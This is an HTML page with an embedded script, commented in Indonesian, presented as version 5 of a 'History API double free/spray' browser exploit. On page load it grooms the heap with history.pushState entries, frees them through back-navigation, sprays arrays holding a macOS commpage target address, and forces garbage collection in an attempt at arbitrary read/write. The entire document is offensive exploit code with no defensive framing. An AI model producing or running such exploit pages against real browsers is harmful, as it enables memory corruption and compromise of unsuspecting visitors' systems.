<!DOCTYPE html>
<html>
<head>
    <title>History API Double FREE/SPRAY Attack (V5)</title>
</head>
<body>

    <h1>History API Double FREE/SPRAY (Arbitrary Read Target)</h1>
    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
    <p id="status">INIT: Mempersiapkan Serangan History API V5...</p>
    <div id="log-area"></div>

    <script>
        // --- KONSTANTA COMM PAGE ---
        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
        
        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);

        let startTime = performance.now();
        let payloadHolders = []; 
        let historyStates = []; // Menyimpan referensi state

        function log(message, type = 'log-info') {
            const timeElapsed = (performance.now() - startTime).toFixed(2);
            const logElement = document.getElementById('log-area');
            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
            logElement.scrollTop = logElement.scrollHeight;
        }

        // --- FUNGSI HEAP SPRAY PAYLOAD ---
        function sprayPayload() {
            log("Memulai Spraying Payload SINKRON...", "log-spray");
            const SPRAY_COUNT = 3000; // Lebih banyak spray
            const PAYLOAD_SIZE = 64; 

            for (let i = 0; i < SPRAY_COUNT; i++) {
                let payloadArray = new Float64Array(PAYLOAD_SIZE);
                payloadArray[0] = HIGH_WORD; // Commpage High
                payloadArray[1] = LOW_WORD;  // Commpage Low
                payloadArray[2] = 2034.0 + i; 
                payloadHolders.push(payloadArray); 
            }
        }

        // --- FUNGSI UTAMA ATTACK ---
        function runHistoryAttack() {
            startTime = performance.now();
            log("Phase 1: Melakukan Heap Grooming dengan History State.", "log-init");

            const HISTORY_COUNT = 100;
            const STATE_ARRAY_SIZE = 1024 * 10; // Ukuran lebih kecil untuk presisi alokasi
            
            // 1. Fragmentasi Heap dengan History State
            for (let i = 0; i < HISTORY_COUNT; i++) {
                let stateArray = new Uint32Array(STATE_ARRAY_SIZE);
                stateArray.fill(0xFEEDFACE + i);
                
                // Simpan state
                window.history.pushState({ id: i, data: stateArray }, `State ${i}`, `#step${i}`);
                historyStates.push(stateArray);
            }
            log(`Phase 2: ${HISTORY_COUNT} History State diserialisasi.`, "log-info");
            
            // --- KONDISI KRITIS: FREE 1 & SPRAY ---

            // 2. FREE 1: Kembali ke state awal (memaksa pembersihan 99 state)
            window.history.go(-HISTORY_COUNT + 1);
            log("Phase 3: Navigasi cepat (FREE 1 aktif).", "log-critical");

            // Lakukan Spray SINKRON segera setelah FREE 1
            // Menimpa lokasi memori dari 99 state yang baru di-free.
            sprayPayload(); 
            log("Phase 4: SPRAY Commpage Payload SINKRON.", "log-critical");

            // Hapus referensi JS (memastikan GC melihatnya kosong)
            historyStates = null;
            
            // --- TRIGGER: FREE 2 ---

            // 3. FREE 2 / Trigger: Navigasi cepat lagi
            // Ini memaksa History Engine memproses kembali *state* yang sudah ditimpa.
            window.history.go(-1); 
            log("Phase 5: Navigasi balik (FREE 2 / Trigger aktif).", "log-critical");

            // 4. Trigger Implisit (untuk memastikan dereferensi)
            setTimeout(() => {
                log("Menunggu Crash Implisit (EXC_BAD_ACCESS/Arbitrary Read)...", "log-info");
                
                // Memicu GC agresif diakhir (memaksa cleanup)
                for(let i = 0; i < 50; i++) {
                    new Array(1024 * 1024 * 5).fill(0xDEADBEEF);
                }
            }, 100);
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('status').textContent = 'Memulai rangkaian History API V5...';
            setTimeout(runHistoryAttack, 50);
            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Arbitrary Read/Write.';
        });
    </script>
    <style>
        #log-area { border: 1px solid #ccc; padding: 10px; margin-top: 15px; max-height: 400px; overflow-y: scroll; font-family: monospace; font-size: 12px; background-color: #f9f9f9; }
        .log-init { color: blue; }
        .log-info { color: black; }
        .log-spray { color: purple; }
        .log-critical { color: red; font-weight: bold; }
        .log-success { color: green; font-weight: bold; }
    </style>
</body>
</html>
